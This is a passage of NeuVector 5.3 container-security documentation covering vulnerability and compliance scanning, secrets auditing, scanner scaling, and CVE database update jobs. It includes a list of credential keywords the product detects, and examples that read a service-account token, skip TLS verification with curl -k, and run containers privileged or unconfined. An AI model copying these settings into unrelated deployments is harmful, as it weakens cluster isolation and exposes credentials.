protected by NeuVector Enforcers, and results of Compliance checks such as CIS benchmarks and custom checks, as well as host vulnerability scans.Containers. All containers in the cluster including system containers, and the results of Compliance checks such as CIS benchmarks and custom checks, as well as container run-time Vulnerability scans. Process activity and performance statistics can also be found here.Registries. Registries/repositories scanned by NeuVector. Layered image scanning results are found here, and scan results can be used in Admission control rules (found in Policy -&gt; Admission Controls).  note Custom compliance checks as mentioned above are defined in the Policy -&gt; Groups menu.  Automated Run-Time Scanning​  NeuVector can scan running containers, host nodes, and the orchestration platform for vulnerabilities. In the Assets menu for Nodes or Containers, enable Auto-Scan by clicking on the Vulnerabilities tab for a node or container, then Auto-Scan (appears in upper right) to scan all running containers, nodes, and platform including newly started ones once they start running. You can also select a container or node and scan it manually.  You can click on each vulnerability name/CVE that is discovered to retrieve a description of it, and click on the inspect arrow in the popup to see the detailed description of the vulnerability.    The auto-scan will also be triggered when ever there is an update to the NeuVector CVE database. Please see the section Updating the CVE Database for details.  ","version":"5.3","tagName":"h3"},{"title":"Automated Actions, Mitigations, and Responses Based on Vulnerabilities​","type":1,"pageTitle":"Scanning & Compliance","url":"/scanning/scanning#automated-actions-mitigations-and-responses-based-on-vulnerabilities","content":" Admission control rules can be created to prevent deployment of vulnerable images based on Registry scanning results. See the Security Policy -&gt; Admission Control section for details.  Please see the section Security Policy -&gt; Response Rules for instructions for creating automated responses to vulnerabilities detected either during registry scanning, run-time scanning, or CIS benchmarks. Responses can include quarantine, webhook notification, and suppression.  Federated Registries for Distributed Image Scanning Results​  The primary (master) cluster can scan a registry/repo designated as a federated registry. The scan results from these registries will be synchronized to all managed (remote) clusters. This enables display of scan results in the managed cluster console as well as use of the results in admission control rules of the managed cluster. Registries only need to be scanned once instead of by each cluster, reducing CPU/memory and network bandwidth usage. See the multi-cluster section for more details.  Auto-scaling of Scanner Pods​  Scanner pods can be configured to auto-scale based on certain criteria. This will ensure that scanning jobs are handled quickly and efficiently, especially if there are thousands of images to be scanned or re-scanned. There are three possible settings: delayed, immediate, and disabled. When images are queued for scanning by the controller, it keeps a 'task count' of the queue size. Please see the multiple scanners section for more details.  important Scanner auto-scaling is not supported when scanner is deployed with an OpenShift operator, as the operator will always change the number of pods to its configured value. ","version":"5.3","tagName":"h3"},{"title":"Compliance & CIS Benchmarks","type":0,"sectionRef":"#","url":"/scanning/scanning/compliance","content":"","keywords":"","version":"5.3"},{"title":"Managing Compliance and CIS Benchmarks​","type":1,"pageTitle":"Compliance & CIS Benchmarks","url":"/scanning/scanning/compliance#managing-compliance-and-cis-benchmarks","content":" Compliance auditing with NeuVector includes CIS Benchmarks, custom checks, secrets auditing, and industry standard templates for PCI, GDPR and other regulations.  CIS Benchmarks automatically run by NeuVector include:  KubernetesDockerRed Hat OpenShift draft 'Inspired by CIS' benchmarksGoogle GKE  Compliance scan results can be seen for individual Assets in the Registries (for Images), Nodes, and Containers menus by selecting the relevant asset and clicking the Compliance tab.  The Security Risks -&gt; Compliance menu enables consolidated compliance reporting, similar to how the Vulnerabilities menu works.  Security Risks - Compliance and Compliance Profile​  Compliance results are show in the list by Category and Name. Categories include Docker, Kubernetes, OpenShift, and Custom. The names of each item correspond to the CIS benchmark. For example, K.4.2.3 corresponds to the Kubernetes CIS benchmark 4.2.3. Docker benchmarks are preceded with 'D' with the exception of Image related benchmarks, which are preceded by 'I'.  Use the Advanced filter to select compliance checks based on platform, host, namespace or industry standard, as shown below.    After applying the filter, only the relevant CIS benchmarks and custom checks will be shown, and a report can be generated and downloaded. This is how reports for standards such as PCI, HIPAA, GDPR and other standards can be generated.  The following screenshot shows an example of a secret found in an image scan.    Customizing Compliance Templates for PCI, GDPR, HIPAA, NIST and others​  The Compliance profile menu enables customization of the built-in templates for industry standards such as PCI and GDPR. These reports can be generated from the Security Risks -&gt; Compliance menu by selecting one of the standards to filter, then exporting. The NIST profile is for NIST SP 800-190.  To customize any compliance profile, select the industry standard (e.g. PCI), then enable or disable specific checks for that standard. Think of these as compliance 'tags' that are applied to each check in order to generate a compliance report for that industry standard.  Use the Action button to add or remove any compliance tag from that check.    In addition, you can select which 'Assets' are considered to be part of the compliance reports by clicking on the Assets tab. By default, all compliance templates are applied to Images, Nodes and Containers.    Use the Action button to add or remove compliance templates for assets.  Images. Select the standard(s) to be reported for Images.Nodes. Select the standard(s) to be reported for Nodes (hosts).Containers. Select the stadard(s) to be reported for Containers.  Alternatively, instead of restricting by the above criteria, compliance templates can be restricted to certain Namespaces. If this box is checked and namespace(s) added, reports will be generated for all assets which apply to these namespaces. This can be useful if, for example, the PCI template should only report on assets for namespaces which container PCI in-scope (applicable) workloads.    After the templates and assets are customized (if desired) in the Security Risks -&gt; Compliance Profiles menu, reports can be generated in the Security Risks -&gt; Compliance menu by opening the advanced filter and selecting the compliance template desired. For example, selecting GDPR will filter the display and reports for only the GDPR profile.  Secrets Auditing​  NeuVector checks for over 40 common types of secrets as part of the image compliance scans and run-time scans. In addition, custom compliance scripts can be configured for containers or hosts, and the DLP packet inspection feature can be used to check for secrets in network payloads.  The results for secrets auditing can be found in the Compliance section of image scans (Assets -&gt; Registries), containers (Assets -&gt; Containers), nodes (Assets -&gt; Nodes), and the compliance management menu (Security Risks -&gt; Compliance).  The following is an example of how secrets detected in an image scan will be displayed.    Here is a list of the types of secrets being detected.  General Private KeysGeneral detection of credentials including 'apikey', 'api_key', 'password', 'secret', 'passwd' etc.General passwords in yaml files including 'password', 'passwd', 'api_token' etc.General secrets keys in key/value pairsPutty Private keyXML Private keyAWS credentials / IAMFacebook client secretFacebook endpoint secretFacebook app secretTwitter client IdTwitter secret keyGithub secretSquare product IdStripe access keySlack API tokenSlack web hooksLinkedIn client IdLinkedIn secret keyGoogle API keySendGrid API keyTwilio API keyHeroku API keyMailChimp API keyMailGun API key ","version":"5.3","tagName":"h3"},{"title":"Parallel & Standalone Scanners","type":0,"sectionRef":"#","url":"/scanning/scanners","content":"","keywords":"","version":"5.3"},{"title":"Increase Scanner Scalability with Multiple Scanners​","type":1,"pageTitle":"Parallel & Standalone Scanners","url":"/scanning/scanners#increase-scanner-scalability-with-multiple-scanners","content":" To increase scanner performance and scalability, NeuVector supports deploying multiple scanner pods which can, in parallel, scan images in registries. The controller assigns scanning tasks to each available scanner pod. Scanner pods can be scaled up or down easily as needed using Kubernetes.  Scanner pods should be deployed to separate nodes to spread the workload across different host resources. Remember that a scanner requires enough memory to pull and expand the image, so it should have available to it more than the largest image size to be scanned. If necessary, scanners can be placed on specific nodes or avoid placing multiple pods on one node using standard Kubernetes node labels, taints/tolerations, or node affinity configurations.  By default, NeuVector deploys 2 scanner pods, as part of the sample deployments in the section Deploying NeuVector. These replicasets can be scaled up or down as needed.  The scanner container the latest CVE database and is regularly updated (with 'latest' tag) by NeuVector. The updater redeploys the scanner, forcing a pull of the latest scanner image in order to get the latest CVE database. See the section Updating the CVE Database for more details on the updater.  Please note that in initial releases the presence and status of multiple scanners is only visible in Kubernetes with 'kubectl get pods -n neuvector' and will not be displayed in the web console.  Scan results from all scanners are shown in the Assets -&gt; Registries menu. Additional scanner monitoring features will be added in future releases.  Auto-scaling of Scanner Pods​  Scanner pods can be configured to auto-scale based on certain criteria. This will ensure that scanning jobs are handled quickly and efficiently, especially if there are thousands of images to be scanned or re-scanned. There are three possible settings: delayed, immediate, and disabled. When images are queued for scanning by the controller, it keeps a 'task count' of the queue size.  Delayed strategy: When lead controller continuously sees &quot;task count&quot; &gt; 0 for &gt; 90 seconds, a new scanner pod is started if maxScannerPods is not reached yetWhen lead controller continuously sees &quot;task count&quot; is 0 for &gt; 180 seconds, it scales down one scanner pod if minScannerPods is not reached yet Immediate strategy: Every time when lead controller sees &quot;task count&quot; &gt; 0, a new scanner pod is started if maxScannerPods is not reached yetWhen lead controller continuously sees &quot;task count&quot; is 0 for &gt; 180 seconds, it scales down one scanner pod if minScannerPods is not reached yet  Scanner auto-scaling is configured in Settings -&gt; Configuration. The minimumScannerPods setting sets the minimum scanner pods running at any time, while the maxScannerPods sets the maximum number of pods that the auto-scaling strategy can scale up to. NOTE: Setting a minimum value will not adjust the original scanner deployment replicaset value. The minimum value will be applied during the first scale up/down event.  important Scanner auto-scaling is not supported when scanner is deployed with an OpenShift operator, as the operator will always change the number of pods to its configured value.  Operations and Debugging​  Each scanner pod will query the registries to be scanned to pull down the complete list of available images and other data. Each scanner will then be assigned an image to pull and scan from the registry.  To inspect the scanner behavior, logs from each scanner pod can be examined using  kubectl logs &lt;scanner-pod-name&gt; -n neuvector   ","version":"5.3","tagName":"h3"},{"title":"Performance Planning​","type":1,"pageTitle":"Parallel & Standalone Scanners","url":"/scanning/scanners#performance-planning","content":" Experiment with varying numbers of scanners on registries with a large number of images to observe the scan completion time behavior in your environment. 2-5 scanners as the replica setting should be sufficient for most cases.  When a scan task is assigned to a scanner, it pulls the image from the registry (after querying the registry for the list of available images). The amount of time it takes to pull the image (download) typically consumes the most time. Multiple scanners can be pulling images from the same registry in parallel, so the performance may be limited by registry or network bandwidth.  Large images will take more time to pull as well as need to be expanded to scan them, consuming more memory. Make sure each scanner has enough memory allocated to it to handle more than the largest expected image (10% more minimum).  Multiple scanner pods can be deployed to the same host/node, but considerations should be made to ensure the host has enough memory, CPU, and network bandwidth for maximizing scanner performance.  ","version":"5.3","tagName":"h3"},{"title":"Standalone Scanner for Local Scanning​","type":1,"pageTitle":"Parallel & Standalone Scanners","url":"/scanning/scanners#standalone-scanner-for-local-scanning","content":" NeuVector supports standalone scanner deployments for local image scanning (which does not require a Controller). In the sample docker run below, the local image will be scanned and the results stored at the /var/neuvector locally. For local scanning, the image must be able to be accessed through the mounted docker.sock, otherwise a registry can be specified.  docker run --name neuvector.scanner --rm -e SCANNER_REPOSITORY=ubuntu -e SCANNER_TAG=16.04 -e SCANNER_ON_DEMAND=true -v /var/run/docker.sock:/var/run/docker.sock -v /var/neuvector:/var/neuvector neuvector/scanner   The following scanner environment variables can be used in the docker run command:  SCANNER_REGISTRY= url of the registry (optional instead of local scan)SCANNER_REPOSITORY= repository to scanSCANNER_TAG= version tagSCANNER_REGISTRY_USERNAME= user (optional instead of local scan)SCANNER_REGISTRY_PASSWORD= password (optional instead of local scan)SCANNER_SCAN_LAYERS= true or false (to return layered scan results)SCANNER_ON_DEMAND=true (required)CLUSTER_JOIN_ADDR (optional), CLUSTER_JOIN_PORT (optional) - to send results to controller for use in Admission control rules (Kubernetes deployed controller).CLUSTER_ADVERTISED_ADDR (optional) - if scanner is on different host than controller, to send results for use in Admission control rules (Kubernetes deployed controller).  Host Scanning in Standalone Mode​  Use the following command to scan the host.  caution Requires privileged mode!  docker run --rm --privileged --pid=host neuvector/scanner -n neuvector   Manual Deployment of Multiple Scanners on Kubernetes​  To manually deploy scanners as part of an existing Kubernetes deployment, create a new role binding:  kubectl create rolebinding neuvector-admin --clusterrole=admin --serviceaccount=neuvector:default -n neuvector   Or for OpenShift  oc adm policy add-role-to-user admin system:serviceaccount:neuvector:default -n neuvector   Use the file below to deploy multiple scanners. Edit the replicas to increase or decrease the number of scanners running in parallel.  apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-scanner-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-scanner-pod strategy: type: RollingUpdate rollingUpdate: maxSurge: 1 maxUnavailable: 0 replicas: 2 template: metadata: labels: app: neuvector-scanner-pod spec: containers: - name: neuvector-scanner-pod image: neuvector/scanner imagePullPolicy: Always env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector # Commented out sections are required only for local build-phase scanning # - name: SCANNER_DOCKER_URL # value: tcp://192.168.1.10:2376 # volumeMounts: # - mountPath: /var/run/docker.sock # name: docker-sock # readOnly: true # volumes: # - name: docker-sock # hostPath: # path: /var/run/docker.sock restartPolicy: Always   Next, create or update the CVE database updater cron job. This will update the CVE database nightly.  apiVersion: batch/v1 kind: CronJob metadata: name: neuvector-updater-pod namespace: neuvector spec: schedule: &quot;0 0 * * *&quot; jobTemplate: spec: template: metadata: labels: app: neuvector-updater-pod spec: containers: - name: neuvector-updater-pod image: neuvector/updater imagePullPolicy: Always command: - /bin/sh - -c - TOKEN=`cat /var/run/secrets/kubernetes.io/serviceaccount/token`; /usr/bin/curl -kv -X PATCH -H &quot;Authorization:Bearer $TOKEN&quot; -H &quot;Content-Type:application/strategic-merge-patch+json&quot; -d '{&quot;spec&quot;:{&quot;template&quot;:{&quot;metadata&quot;:{&quot;annotations&quot;:{&quot;kubectl.kubernetes.io/restartedAt&quot;:&quot;'`date +%Y-%m-%dT%H:%M:%S%z`'&quot;}}}}}' 'https://kubernetes.default/apis/apps/v1/namespaces/neuvector/deployments/neuvector-scanner-pod' restartPolicy: Never  ","version":"5.3","tagName":"h3"},{"title":"Vulnerability Management","type":0,"sectionRef":"#","url":"/scanning/scanning/vulnerabilities","content":"","keywords":"","version":"5.3"},{"title":"Managing Vulnerabilities with NeuVector​","type":1,"pageTitle":"Vulnerability Management","url":"/scanning/scanning/vulnerabilities#managing-vulnerabilities-with-neuvector","content":" NeuVector enables automated vulnerability scanning and management throughout the pipeline. Best practices for managing vulnerabilities in NeuVector include:  Scan during the build-phase, failing the build if there are critical vulnerabilities 'with fix available.' This forces developers to address fixable vulnerabilities before storing in registries.Scan staging and production registries continuously to look for newly discovered vulnerabilities. Vulnerabilities with fixes available can be required to be fixed immediately, or a grace period allowed to provide time to remediate them.Configure Admission Control rules to block deployments into production based on criteria such as critical/high, fix available, and reported date.Continuously scan the production nodes/hosts, containers, and orchestration platform for vulnerabilities for newly discovered vulnerabilities. Implement responses based on criticality/severity that can be webhook alerts (that contact security and developer), quarantine container, or start a grace period for remediation.Ensure running containers are in Monitor or Protect mode with appropriate whitelist rules to 'virtually patch' vulnerabilities to prevent any exploit in production.Scan distroless and PhotonOS based images.  The Dashboard in NeuVector presents a summary risk score which includes vulnerabilities, which can be used to reduce risk from vulnerabilities. See how to improve the risk score for more details.  The other main tool for reviewing, filtering, and reporting on vulnerabilities is in the Security Risks menu.  Security Risks Menu - Vulnerabilities​  This menu combines the results from registry (image), node, and container vulnerability scans and compliance checks found in the Assets menu to enable end-to-end vulnerability management and reporting.  The Vulnerabilities menu provides a powerful explorer tool to:  Make it easy to filter for viewing or downloading of reports, by typing in a search string or using the advanced filter next to the box. The advanced filter allows users to filter vulnerabilities by fix available (or not available), urgency, workloads, service, container, nodes or namespace names.Understand the Impact of vulnerabilities and compliance checks by clicking on the impact row and reviewing remediation and impacted images, nodes, or containers.View the Protection Status (exploit risk) of any vulnerability or compliance issue to see if there are NeuVector Run-Time security protections (rules) enabled for impacted nodes or containers.'Accept' a vulnerability/CVE after it has been reviewed to hide it from views and suppress it from reports.    Use the filter box to enter a string match, or use the advanced filter next to it to select more specific criteria, as shown below. Downloaded PDF and CSV reports will show only the filtered results.    Selecting any CVE listed provides additional details about the CVE, remediation, and which images, nodes, or containers are Impacted. The Protection State icon (circle) shows various colors to indicate a rough percentage of the impacted items which are unprotected by NeuVector during run-time, protected by NeuVector rules (in a Monitor or Protect mode), or unaffected in run-time (e.g. an image scanned with this vulnerability has no running containers). The Protection State column color scheme is:  Black = unaffectedGreen = protected by NeuVector with Monitor or Protect modeRed = unprotected by NeuVector, still in Discover mode  The Impact analysis window (showing affected images, nodes, containers) color scheme is:  Black = unaffected. There are no containers using this image in productionPurple = running in Monitor mode in productionDark Green = running in Protect mode in productionLight Blue = running in Discover mode in production (unprotected)  The Impact colors are meant to correspond to the run-time protection colors for Discover, Monitor and Protect modes in other places in the NeuVector console.  Accepting Vulnerabilities​  You can 'Accept' a vulnerability (CVE) to exclude it from reports, views, risk scoring etc. A vulnerability can be selected and the Accept button clicked from several screens such as Security Risks -&gt; Vulnerabilities, Assets -&gt; Containers etc. Once accepted, it is added to the Security Risks -&gt; Vulnerability Profile list. It can be viewed, exported, and edited here. Note that this Accept feature can be limited to listed Images and/or Namespaces. New entries can also be added manually to this list from this screen.  To Accept a vulnerability globally, go to the Security Risks -&gt; Vulnerabilities page and select the vulnerability, then Accept. This will create a Vulnerability Profile for this CVE globally.    To Accept a vulnerability found in an image scan, open the image scan results in Assets -&gt; Registries, pull down the View dropdown and select Accept. Note that you can also choose to Show or Hide accepted vulnerabilities for this image. NOTE: This action will create a Vulnerability Profile entry for this CVE in this IMAGE only.    To Accept a vulnerability found in a container in Assets -&gt; Containers, select the vulnerability and pull down the View dropdown and select Accept. Note that you can also choose to Show or Hide accepted vulnerabilities for this container. NOTE: This action will create a Vulnerability Profile for this CVE in this NAMESPACE only.    This action can also be performed in Assets -&gt; Nodes, which will create a Vulnerability Profile for the CVE for all containers, images and namespaces.  important Globally Accepted vulnerabilities are excluded from the view in Security Risks -&gt; Vulnerabilities and in exported reports from this page. Accepted vulnerabilities which are limited to specific images or namespaces will continue to show in the view, but be excluded for reports where the Advanced Filter limits the view to those images or namespaces.  Managing Vulnerability Profiles​  Each accepted vulnerability/CVE creates an entry in the Security Risks -&gt; Vulnerability Profile list. These entries can be edited to add or remove attributes such as image name(s) and namespace(s).    New accepted vulnerabilities can also be added here by entering the CVE name to be Accepted. ","version":"5.3","tagName":"h3"},{"title":"Deployment Examples for Special Deployments Using the Allinone Container","type":0,"sectionRef":"#","url":"/special","content":"Deployment Examples for Special Deployments Using the Allinone Container How to deploy NeuVector using Kubernetes, OpenShift, Docker EE/UCP, Rancher, public cloud Kubernetes services and more…","keywords":"","version":"5.3"},{"title":"Updating the CVE Database","type":0,"sectionRef":"#","url":"/scanning/updating","content":"","keywords":"","version":"5.3"},{"title":"Updating the NeuVector CVE Vulnerability Database​","type":1,"pageTitle":"Updating the CVE Database","url":"/scanning/updating#updating-the-neuvector-cve-vulnerability-database","content":" The Scanner image/pod performs the scans with its internal CVE database. The scanner image is updated on the NeuVector Docker Hub registry with the latest CVE database frequently, as often as daily if there are updates. To update the CVE database used in scanning, simply pull and deploy the latest Scanner image. The latest database version number can be found listed here.  A container called the Updater performs the task of restarting the scanner pods in order to force a pull of the latest image, which will update the CVE database. To automatically check for updates and update the scanner, an updater cron job can be created.  By default, the updater cron job shown below is automatically started from the sample deployment yaml files for Kubernetes and OpenShift. This will automatically check for new CVE database updates through new scanner versions published on the NeuVector Docker hub registry. Manual updates on docker native deployments are shown below. For OpenShift deployments or others where images have to be manually pulled from NeuVector, the scanner with the 'latest' tag should be pulled from NeuVector to update the CVE database.  For registry scanning, if the box 'Rescan after CVE DB update' is enabled, all images in that registry will be rescanned after a CVE database update. For run-time scanning, all running assets will be rescanned after a CVE database update if the Auto-Scan feature is enabled.  Updater Cron Job​  This cron job is deployed by NeuVector automatically as part of the sample deployment, so is typically not required to start manually.  The Updater is a container image which, when run, restarts the scanner deployment, forcing the pull of the latest Scanner image. The updater re-deploys all scanner pods by taking the deployment to zero and scaling it back up.  The cron job sample neuvector-updater.yaml below for Kubernetes 1.8 and later runs the updater every day at midnight. The schedule can be adjusted as desired.  Sample updater yaml:  apiVersion: batch/v1 kind: CronJob metadata: name: neuvector-updater-pod namespace: neuvector spec: schedule: &quot;0 0 * * *&quot; jobTemplate: spec: template: metadata: labels: app: neuvector-updater-pod spec: containers: - name: neuvector-updater-pod image: neuvector/updater imagePullPolicy: Always command: - /bin/sh - -c - TOKEN=`cat /var/run/secrets/kubernetes.io/serviceaccount/token`; /usr/bin/curl -kv -X PATCH -H &quot;Authorization:Bearer $TOKEN&quot; -H &quot;Content-Type:application/strategic-merge-patch+json&quot; -d '{&quot;spec&quot;:{&quot;template&quot;:{&quot;metadata&quot;:{&quot;annotations&quot;:{&quot;kubectl.kubernetes.io/restartedAt&quot;:&quot;'`date +%Y-%m-%dT%H:%M:%S%z`'&quot;}}}}}' 'https://kubernetes.default/apis/apps/v1/namespaces/neuvector/deployments/neuvector-scanner-pod' restartPolicy: Never   note If the allinone container was deployed instead of the controller, replace neuvector-svc-controller.neuvector with neuvector-svc-allinone.neuvector  To run the cron job  kubectl create -f neuvector-updater.yaml   ","version":"5.3","tagName":"h3"},{"title":"Docker Native Updates​","type":1,"pageTitle":"Updating the CVE Database","url":"/scanning/updating#docker-native-updates","content":" important Always use the :latest tag when pulling and running the scanner image to ensure the latest CVE database is deployed.  For docker native:  docker stop scanner docker rm &lt;scanner id&gt; docker pull neuvector/scanner:latest &lt;docker run command from below&gt;   note docker rm -f &lt;scanner id&gt; can also be used to force stop and removal of the running scanner.  For docker-compose  docker-compose -f file.yaml down docker-compose -f file.yaml pull // pre-pull the image before starting the scanner docker-compose -f file.yaml up -d   Sample docker run  docker run -td --name scanner -e CLUSTER_JOIN_ADDR=controller_node_ip -e CLUSTER_ADVERTISED_ADDR=node_ip -e SCANNER_DOCKER_URL=tcp://192.168.1.10:2376 -p 18402:18402 -v /var/run/docker.sock:/var/run/docker.sock:ro neuvector/scanner:latest   And sample docker-compose  Scanner: image: neuvector/scanner:latest container_name: scanner environment: - SCANNER_DOCKER_URL=tcp://192.168.1.10:2376 - CLUSTER_JOIN_ADDR=controller_node_ip - CLUSTER_ADVERTISED_ADDR=node_ip ports: - 18402:18402 volumes: - /var/run/docker.sock:/var/run/docker.sock:ro   ","version":"5.3","tagName":"h3"},{"title":"CVE Database Version​","type":1,"pageTitle":"Updating the CVE Database","url":"/scanning/updating#cve-database-version","content":" The CVE database version can be seen in the Console in the Vulnerabilities tab. You can also inspect the scanner container logs or updater image.  To use the REST API to query the version:  curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://127.0.0.1:10443/v1/scan/scanner&quot;   Output:  { &quot;scanners&quot;: [ { &quot;cvedb_create_time&quot;: &quot;2020-07-07T10:34:04Z&quot;, &quot;cvedb_version&quot;: &quot;1.950&quot;, &quot;id&quot;: &quot;0f043705948557828ac1831ee596588a0d050950113117ddd19ecd604982f4d9&quot;, &quot;port&quot;: 18402, &quot;server&quot;: &quot;127.0.0.1&quot; }, { &quot;cvedb_create_time&quot;: &quot;2020-07-07T10:34:04Z&quot;, &quot;cvedb_version&quot;: &quot;1.950&quot;, &quot;id&quot;: &quot;9fa02c644d603f59331c95735158d137002d32a75ed1014326f5039f38d4d717&quot;, &quot;port&quot;: 18402, &quot;server&quot;: &quot;192.168.9.95&quot; } ] }   Using kubectl:  kubectl logs neuvector-scanner-pod-5687dcb6fd-2h4sj -n neuvector | grep version   Sample output:  2020-09-15T00:00:57.909|DEBU|SCN|memdb.ReadCveDb: New DB found - update=2020-09-14T10:37:56Z version=2.04 2020-09-15T00:01:10.06 |DEBU|SCN|main.scannerRegister: - entries=47016 join=neuvector-svc-controller.neuvector:18400 version=2.040   Or for docker:  docker logs &lt;scanner container id or name&gt; | grep version   2020-09-15T00:00:57.909|DEBU|SCN|memdb.ReadCveDb: New DB found - update=2020-09-14T10:37:56Z version=2.04 2020-09-15T00:01:10.06 |DEBU|SCN|main.scannerRegister: - entries=47016 join=neuvector-svc-controller.neuvector:18400 version=2.040   ","version":"5.3","tagName":"h3"},{"title":"Manual Updates on Kubernetes​","type":1,"pageTitle":"Updating the CVE Database","url":"/scanning/updating#manual-updates-on-kubernetes","content":" Below is an example for manually updating the CVE database on Kubernetes or OpenShift.  Run the updater file below  kubectl create -f neuvector-manual-updater.yaml   Sample file  apiVersion: v1 kind: Pod metadata: name: neuvector-updater-pod namespace: neuvector spec: containers: - name: neuvector-updater-pod image: neuvector/updater imagePullPolicy: Always command: - /bin/sh - -c - TOKEN=`cat /var/run/secrets/kubernetes.io/serviceaccount/token`; /usr/bin/curl -kv -X PATCH -H &quot;Authorization:Bearer $TOKEN&quot; -H &quot;Content-Type:application/strategic-merge-patch+json&quot; -d '{&quot;spec&quot;:{&quot;template&quot;:{&quot;metadata&quot;:{&quot;annotations&quot;:{&quot;kubectl.kubernetes.io/restartedAt&quot;:&quot;'`date +%Y-%m-%dT%H:%M:%S%z`'&quot;}}}}}' 'https://kubernetes.default/apis/apps/v1/namespaces/neuvector/deployments/neuvector-scanner-pod' restartPolicy: Never  ","version":"5.3","tagName":"h3"},{"title":"General Guidelines","type":0,"sectionRef":"#","url":"/special/general","content":"","keywords":"","version":"5.3"},{"title":"Testing NeuVector Using the Allinone Container​","type":1,"pageTitle":"General Guidelines","url":"/special/general#testing-neuvector-using-the-allinone-container","content":" The examples in this section deploy the Allinone and Enforcer containers. This is useful for trying out NeuVector, especially on non-Kubernetes (e.g. docker native) environments. For Kubernetes based deployments using the latest NeuVector Helm chart is recommended. Please see the section Deploying NeuVector.  ","version":"5.3","tagName":"h3"},{"title":"General Guidelines for Deployment​","type":1,"pageTitle":"General Guidelines","url":"/special/general#general-guidelines-for-deployment","content":" Prepare your host environment for proper installation. Make sure the NeuVector containers can communicate with each other between hosts. Then review and edit the sample files for you environment.  Generally, it is important to do the following:  Label nodes appropriately. If you use node labels to control where the allinone or controller is deployed, label them before deploying.Make sure volumes can be mapped properly. For example  volumes: - /var/neuvector:/var/neuvector - /var/run/docker.sock:/var/run/docker.sock - /proc:/host/proc:ro - /sys/fs/cgroup:/host/cgroup:ro   Open required ports on hosts. Make sure the required ports are mapped properly and open on the host. The allinone requires 8443 (if using the console), 18300, 18301, 18400, and 18401. The Enforcer requires 18301 and 18401. Edit the CLUSTER_JOIN_ADDR. Find the node IP address, node name (if using a name server, or node variable (if using orchestration tools) for the allinone (controller) to use for the “node IP” in the sample files for both allinone and enforcer.  ","version":"5.3","tagName":"h3"},{"title":"Accessing the Console​","type":1,"pageTitle":"General Guidelines","url":"/special/general#accessing-the-console","content":" Please see the first section Basics -&gt; Connect to Manager for options for turning off https or accessing the console through a corporate firewall which does not allow port 8443 for the console access. ","version":"5.3","tagName":"h3"},{"title":"Mirantis Kubernetes Engine","type":0,"sectionRef":"#","url":"/special/docker","content":"","keywords":"","version":"5.3"},{"title":"Deploy to Swarm Cluster​","type":1,"pageTitle":"Mirantis Kubernetes Engine","url":"/special/docker#deploy-to-swarm-cluster","content":" To deploy NeuVector using a Swarm cluster, first pull the NeuVector images using Docker UCP in the Images menu. You may need to add a version number to get the latest version on Docker Hub.  Currently, Swarm/UCP does not support the seccomp capabilities (cap_add options) or deploying in ‘privileged mode’ so the NeuVector containers will need to be deployed from the command line using docker-compose or run. See the sample compose files for the allinone and enforcer below.  The Docker UCP HRM service uses the default port 8443 which conflicts with the NeuVector console port. If using the default HRM port, then change the NeuVector port mapping, for example 9443:8443 for the allinone container in the examples below. After the NeuVector application is successfully deployed, login to the console on port 9443 of the allinone host.  ","version":"5.3","tagName":"h3"},{"title":"Deploy on Docker Swarm Using Privileged Mode​","type":1,"pageTitle":"Mirantis Kubernetes Engine","url":"/special/docker#deploy-on-docker-swarm-using-privileged-mode","content":" The following is an example of the docker-compose file to deploy the all-in-one container on the first node. Because the all-in-one container has an enforcer module inside, application containers on the same node can be secured. Both greenfield and brownfield deployment are supported.  Deploy all-in-one using docker-compose (privileged mode):  allinone: pid: host image: neuvector/allinone:&lt;version&gt; container_name: allinone privileged: true environment: - CLUSTER_JOIN_ADDR=node_ip ports: - 18300:18300 - 18301:18301 - 18400:18400 - 18401:18401 - 18301:18301/udp - 9443:8443 volumes: - /lib/modules:/lib/modules - /var/neuvector:/var/neuvector - /var/run/docker.sock:/var/run/docker.sock - /proc:/host/proc:ro - /sys/fs/cgroup:/host/cgroup:ro   The most important environment variable is the CLUSTER_JOIN_ADDR. It is the IP address that other enforcers connect to. Normally, it should be set to the IP address of the node where all-in-one container is running.  Port 18300 and 18301 are default ports for cluster communication. They must be identical for all controllers and enforcers in the cluster. Please refer to &quot;Docker-compose Details&quot; section for how to change the default ports.  Add an enforcer container using docker-compose (privileged mode)  This is an example of docker-compose file to join an enforcer into the cluster. Both greenfield and brownfield deployment are supported.  enforcer: pid: host image: neuvector/enforcer:&lt;version&gt; container_name: enforcer privileged: true environment: - CLUSTER_JOIN_ADDR=controller_node_ip ports: - 18301:18301 - 18401:18401 - 18301:18301/udp volumes: - /lib/modules:/lib/modules - /var/run/docker.sock:/var/run/docker.sock - /proc:/host/proc:ro - /sys/fs/cgroup/:/host/cgroup/:ro   The most important environment variable is CLUSTER_JOIN_ADDR. For enforcers, replace &lt;controller_node_ip&gt; with the controller's node IP address. Typically, CLUSTER_JOIN_ADDR in the controller/all-in-one's docker-compose file and enforcer's docker-compose file have the same value.  From NeuVector 4.0+, a separate scanner container must be deployed to perform vulnerability scanning.  Sample docker-compose for the Scanner:  Scanner: image: neuvector/scanner container_name: scanner environment: - SCANNER_DOCKER_URL=tcp://192.168.1.10:2376 - CLUSTER_JOIN_ADDR=controller_node_ip ports: - 18402:18402 volumes: - /var/run/docker.sock:/var/run/docker.sock:ro   ","version":"5.3","tagName":"h3"},{"title":"Deployment Without Using Privileged Mode​","type":1,"pageTitle":"Mirantis Kubernetes Engine","url":"/special/docker#deployment-without-using-privileged-mode","content":" For some platform configurations it is possible to deploy the NeuVector containers without requiring them to run in privileged mode. The configuration must support the ability to add capabilities and set the apparmour profile. Note that Docker DataCenter/UCP and Swarm currently do not support this, but it is still possible to deploy NeuVector manually using Compose or Run.  Deploy allinone (NO privileged mode) with docker-compose  allinone: pid: host image: neuvector/allinone container_name: neuvector.allinone cap_add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK security_opt: - apparmor=unconfined - seccomp=unconfined - label=disable environment: - CLUSTER_JOIN_ADDR=[AllInOne Node IP Address] ports: - 18300:18300 - 18301:18301 - 18400:18400 - 18401:18401 - 18301:18301/udp - 9443:8443 volumes: - /lib/modules:/lib/modules - /var/run/docker.sock:/var/run/docker.sock - /proc:/host/proc:ro - /sys/fs/cgroup:/host/cgroup:ro - /var/neuvector:/var/neuvector   Deploy enforcer (NO privileged mode) with docker-compose  enforcer: pid: host image: neuvector/enforcer container_name: neuvector.enforcer 